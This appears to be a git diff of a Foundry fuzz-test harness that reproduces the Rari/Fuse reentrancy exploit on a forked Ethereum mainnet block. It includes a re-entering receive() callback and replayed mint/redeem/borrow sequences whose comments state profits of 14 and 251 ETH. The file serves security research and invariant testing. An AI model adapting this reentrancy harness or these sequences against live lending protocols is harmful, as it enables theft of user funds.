@@ -27,20 +27,35 @@ contract TestAccount {
     }
 
     receive() external payable {
-        if (msg.sender == address(handler)) {
+        if (msg.sender == address(handler) || !handler.reentrancyEnabled()) {
             return;
         }
 
-        handler.performCallback();
+        /// Perform callback using handler fuzzed params.
+        uint256 functionId = (handler.reentrancyCallback() % 6) + 1;
+
+        if (functionId == 1) {
+            handler.mint(handler.reentrancyUint0());
+        } else if (functionId == 2) {
+            handler.redeem(handler.reentrancyUint0());
+        } else if (functionId == 3) {
+            handler.borrow(handler.reentrancyUint0());
+        } else if (functionId == 4) {
+            handler.repay(handler.reentrancyUint0());
+        } else if (functionId == 5) {
+            handler.exitMarket();
+        } else if (functionId == 6) {
+            handler.accrueInterest();
+        }
     }
 }
 
 contract RariFuzzHandler is RariAddresses, Test {
     address public ACCOUNT1;
 
-    bool internal enabled;
-    uint8 internal callback;
-    uint256 internal uint0;
+    bool public reentrancyEnabled;
+    uint8 public reentrancyCallback;
+    uint256 public reentrancyUint0;
 
     constructor(address account1) {
         ACCOUNT1 = account1;
@@ -50,7 +65,7 @@ contract RariFuzzHandler is RariAddresses, Test {
         amount = amount % (usdc.balanceOf(ACCOUNT1) + 1);
 
         vm.prank(ACCOUNT1);
-        uint256 error = fUsdc.mint(amount);
+        fUsdc.mint(amount);
     }
 
     function redeem(uint256 amount) public {
@@ -67,8 +82,7 @@ contract RariFuzzHandler is RariAddresses, Test {
         vm.prank(ACCOUNT1);
         comptroller.enterMarkets(ctokens);
 
-        (uint256 error, uint256 liquidity, uint256 shortfall) = comptroller
-            .getAccountLiquidity(ACCOUNT1);
+        (, uint256 liquidity, ) = comptroller.getAccountLiquidity(ACCOUNT1);
         amount = amount % (liquidity + 1);
 
         vm.prank(ACCOUNT1);
@@ -94,58 +108,24 @@ contract RariFuzzHandler is RariAddresses, Test {
     }
 
     /// REENTRANCY
-    function updateReentrancy(
-        bool _enabled,
-        uint8 _callback,
-        uint256 _uint0
-    ) public {
-        enabled = _enabled;
-        callback = _callback;
-        uint0 = _uint0;
-    }
-
     function setReentrancyEnabled(bool _enabled) public {
-        enabled = _enabled;
+        reentrancyEnabled = _enabled;
     }
 
     function setReentrancyCallback(uint8 _callback) public {
-        callback = _callback;
+        reentrancyCallback = _callback;
     }
 
     function setReentrancyUint0(uint256 _uint0) public {
-        uint0 = _uint0;
+        reentrancyUint0 = _uint0;
     }
 
-    function performCallback() public {
-        if (!enabled) return;
-
-        uint256 functionId = (callback % 6) + 1;
-
-        if (functionId == 1) {
-            mint(uint0);
-        } else if (functionId == 2) {
-            redeem(uint0);
-        } else if (functionId == 3) {
-            borrow(uint0);
-        } else if (functionId == 4) {
-            repay(uint0);
-        } else if (functionId == 5) {
-            exitMarket();
-        } else if (functionId == 6) {
-            accrueInterest();
-        }
-    }
-
-    function getAccountBalance(address account)
-        public
-        view
-        returns (uint256 value)
-    {
+    function getAccountBalance() public view returns (uint256 value) {
         uint256 ethDecimals = 18;
         uint256 usdcDecimals = 6;
 
-        uint256 ethBalance = account.balance;
-        uint256 usdcBalance = usdc.balanceOf(account);
+        uint256 ethBalance = ACCOUNT1.balance;
+        uint256 usdcBalance = usdc.balanceOf(ACCOUNT1);
 
         uint256 ethPrice = 1 ether;
         uint256 usdcPrice = oracle.price(address(usdc));
@@ -169,29 +149,26 @@ contract RariTest is RariAddresses, Test {
     TestAccount account1;
 
     function setUp() public {
-        vm.createSelectFork("mainnet", 14684813);
+        vm.createSelectFork(vm.envString("ETH_RPC_URL"), 14684813);
 
+        // Create test account.
         account1 = new TestAccount();
-        vm.label(address(account1), "Account1");
+        address account1Address = address(account1);
+        vm.label(account1Address, "Account1");
 
-        handler = new RariFuzzHandler(address(account1));
-
+        // Create handler contract to fuzz.
+        handler = new RariFuzzHandler(account1Address);
         account1.setHandler(handler);
 
-        vm.deal(address(account1), STARTING_ETH_BALANCE);
-        deal(address(usdc), address(account1), STARTING_TOKEN_BALANCE);
-
-        vm.prank(address(account1));
+        // Fund test account with ETH and USDC and approve fUsdc spender.
+        vm.deal(account1Address, STARTING_ETH_BALANCE);
+        deal(address(usdc), account1Address, STARTING_TOKEN_BALANCE);
+        vm.prank(account1Address);
         usdc.approve(address(fUsdc), type(uint256).max);
 
-        account1InitialBalance = handler.getAccountBalance(address(account1));
+        account1InitialBalance = handler.getAccountBalance();
 
         targetContract(address(handler));
-    }
-
-    function afterInvariant() public {
-        handler.exitMarket();
-        checkInvariant();
     }
 
     /// forge-config: default.invariant.runs = 1000
@@ -200,10 +177,14 @@ contract RariTest is RariAddresses, Test {
         checkInvariant();
     }
 
-    function checkInvariant() private {
-        int256 account1Profit = int256(
-            handler.getAccountBalance(address(account1))
-        ) - int256(account1InitialBalance);
+    function afterInvariant() public {
+        handler.exitMarket();
+        checkInvariant();
+    }
+
+    function checkInvariant() internal {
+        int256 account1Profit = int256(handler.getAccountBalance()) -
+            int256(account1InitialBalance);
 
         vm.writeLine(
             "logFile.txt",
@@ -212,7 +193,10 @@ contract RariTest is RariAddresses, Test {
         require(account1Profit <= PROFIT_TARGET, "Account1 profit!");
     }
 
-    function testRariHackEchidna() public {
+    /// Unit tests for sequences to reproduce issue.
+
+    /// Original sequence from https://github.com/rappie/echidna-rari-hack.
+    function testRariReproEchidna() public {
         handler.setReentrancyEnabled(true);
         handler.mint(
             10089325332519370949262917519849428342404732088146691233195543578618300570336
@@ -223,7 +207,8 @@ contract RariTest is RariAddresses, Test {
         checkInvariant();
     }
 
-    function testRariHackFoundry() public {
+    /// Sequence yielding a profit of 14.042565409259645499 ETH.
+    function testRariReproFoundry() public {
         handler.setReentrancyEnabled(true);
         handler.mint(34480686646904748734687845775862632361229606401142);
         handler.redeem(146819705882536770626717166753626284388);
@@ -239,6 +224,22 @@ contract RariTest is RariAddresses, Test {
         handler.setReentrancyCallback(4);
         handler.borrow(4760753135904324988326715789554485535);
         handler.redeem(447649540520714);
+        checkInvariant();
+    }
+
+    /// Sequence yielding a profit of 251.092507969757790482 ETH.
+    function testRariReproFoundry1() public {
+        handler.setReentrancyEnabled(true);
+        handler.mint(45778455268918263640951207098);
+        handler.redeem(2239);
+        handler.mint(908257824107570795476750864031);
+        handler.mint(6605);
+        handler.redeem(
+            31661082072479443877711301545670601430554519912440964396920010859656321
+        );
+        handler.setReentrancyCallback(4);
+        handler.borrow(104558218978698757946920526751204333464303325974512028);
+        handler.redeem(1564938114064896760);
         checkInvariant();
     }
 }
